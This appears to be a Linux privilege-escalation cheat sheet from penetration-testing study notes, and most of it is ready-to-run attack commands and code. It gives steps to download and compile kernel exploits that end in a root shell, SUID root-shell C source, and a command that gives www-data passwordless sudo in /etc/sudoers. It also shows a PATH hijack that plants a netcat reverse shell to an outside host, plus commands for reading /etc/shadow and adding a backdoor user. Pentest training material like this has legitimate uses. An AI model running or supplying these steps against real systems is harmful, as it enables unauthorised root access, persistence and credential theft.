*   ## [](#linux-privilege-escalation)Linux Privilege Escalation

*   Defacto Linux Privilege Escalation Guide - A much more through guide for linux enumeration:[https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](http://web.archive.org/web/20171113221652/https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

*   Try the obvious - Maybe the user is root or can sudo to root:

    `id`

    `sudo su`

*   Here are the commands I have learned to use to perform linux enumeration and privledge escalation:

    What users can login to this box (Do they use thier username as thier password)?:

    `grep -vE "nologin|false" /etc/passwd`

    What kernel version are we using? Do we have any kernel exploits for this version?

    `uname -a`

    `searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"`

    What applications have active connections?:

    `netstat -tulpn`

    What services are running as root?:

    `ps aux | grep root`

    What files run as root / SUID / GUID?:

         find / -perm +2000 -user root -type f -print
         find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
         find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
         find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
         find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
         for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done  
         find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null

    What folders are world writeable?:

         find / -writable -type d 2>/dev/null      # world-writeable folders
         find / -perm -222 -type d 2>/dev/null     # world-writeable folders
         find / -perm -o w -type d 2>/dev/null     # world-writeable folders
         find / -perm -o x -type d 2>/dev/null     # world-executable folders
         find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders

*   There are a few scripts that can automate the linux enumeration process:

    *   Google is my favorite Linux Kernel exploitation search tool. Many of these automated checkers are missing important kernel exploits which can create a very frustrating blindspot during your OSCP course.

    *   LinuxPrivChecker.py - My favorite automated linux priv enumeration checker -

        [https://www.securitysift.com/download/linuxprivchecker.py](http://web.archive.org/web/20171113221652/https://www.securitysift.com/download/linuxprivchecker.py)

    *   LinEnum - (Recently Updated)

    [https://github.com/rebootuser/LinEnum](http://web.archive.org/web/20171113221652/https://github.com/rebootuser/LinEnum)

    *   linux-exploit-suggester (Recently Updated)

    [https://github.com/mzet-/linux-exploit-suggester](http://web.archive.org/web/20171113221652/https://github.com/mzet-/linux-exploit-suggester)

    *   Highon.coffee Linux Local Enum - Great enumeration script!

        `wget https://highon.coffee/downloads/linux-local-enum.sh`

    *   Linux post exploitation enumeration and exploit checking tools

    [https://github.com/reider-roque/linpostexp](http://web.archive.org/web/20171113221652/https://github.com/reider-roque/linpostexp)
    
    *   Linux Privilege Escalation Awesome Script

    [LinPeas](https://github.com/carlospolop/PEASS-ng)

Handy Kernel Exploits

*   CVE-2010-2959 - 'CAN BCM' Privilege Escalation - Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32)

    [https://www.exploit-db.com/exploits/14814/](http://web.archive.org/web/20171113221652/https://www.exploit-db.com/exploits/14814/)

         wget -O i-can-haz-modharden.c http://www.exploit-db.com/download/14814
         $ gcc i-can-haz-modharden.c -o i-can-haz-modharden
         $ ./i-can-haz-modharden
         [+] launching root shell!
         # id
         uid=0(root) gid=0(root)

*   CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8  
    [https://www.exploit-db.com/exploits/15285/](http://web.archive.org/web/20171113221652/https://www.exploit-db.com/exploits/15285/)

*   CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)  
    [https://git.zx2c4.com/CVE-2012-0056/about/](http://web.archive.org/web/20171113221652/https://git.zx2c4.com/CVE-2012-0056/about/)  
    Linux CVE 2012-0056

          wget -O exploit.c http://www.exploit-db.com/download/18411 
          gcc -o mempodipper exploit.c  
          ./mempodipper

*   CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8  
    [https://dirtycow.ninja/](http://web.archive.org/web/20171113221652/https://dirtycow.ninja/)  
    First existed on 2.6.22 (released in 2007) and was fixed on Oct 18, 2016

*   Run a command as a user other than root

          sudo -u haxzor /usr/bin/vim /etc/apache2/sites-available/000-default.conf

*   Add a user or change a password

          /usr/sbin/useradd -p 'openssl passwd -1 thePassword' haxzor  
          echo thePassword | passwd haxzor --stdin

*   Local Privilege Escalation Exploit in Linux

    *   **SUID** (**S**et owner **U**ser **ID** up on execution)  
        Often SUID C binary files are required to spawn a shell as a superuser, you can update the UID / GID and shell as required.

        below are some quick copy and paste examples for various shells:

              SUID C Shell for /bin/bash  

              int main(void){  
              setresuid(0, 0, 0);  
              system("/bin/bash");  
              }  

              SUID C Shell for /bin/sh  

              int main(void){  
              setresuid(0, 0, 0);  
              system("/bin/sh");  
              }  

              Building the SUID Shell binary  
              gcc -o suid suid.c  
              For 32 bit:  
              gcc -m32 -o suid suid.c

    *   Create and compile an SUID from a limited shell (no file transfer)

              echo "int main(void){\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/sh\");\n}" >privsc.c  
              gcc privsc.c -o privsc

*   Handy command if you can get a root user to run it. Add the www-data user to Root SUDO group with no password requirement:

    `echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update`

*   You may find a command is being executed by the root user, you may be able to modify the system PATH environment variable to execute your command instead. In the example below, ssh is replaced with a reverse shell SUID connecting to 10.10.10.1 on port 4444.

         set PATH="/tmp:/usr/local/bin:/usr/bin:/bin"
         echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 >/tmp/f" >> /tmp/ssh
         chmod +x ssh

*   SearchSploit

              searchsploit –uncsearchsploit apache 2.2  
              searchsploit "Linux Kernel"  
              searchsploit linux 2.6 | grep -i ubuntu | grep local  
              searchsploit slmail

*   Kernel Exploit Suggestions for Kernel Version 3.0.0

    `./usr/share/linux-exploit-suggester/Linux_Exploit_Suggester.pl -k 3.0.0`

*   Precompiled Linux Kernel Exploits - _**Super handy if GCC is not installed on the target machine!**_

    [_https://www.kernel-exploits.com/_](http://web.archive.org/web/20171113221652/https://www.kernel-exploits.com/)

*   Collect root password

    `cat /etc/shadow |grep root`

*   Find and display the proof.txt or flag.txt - LOOT!

            cat `find / -name proof.txt -print`
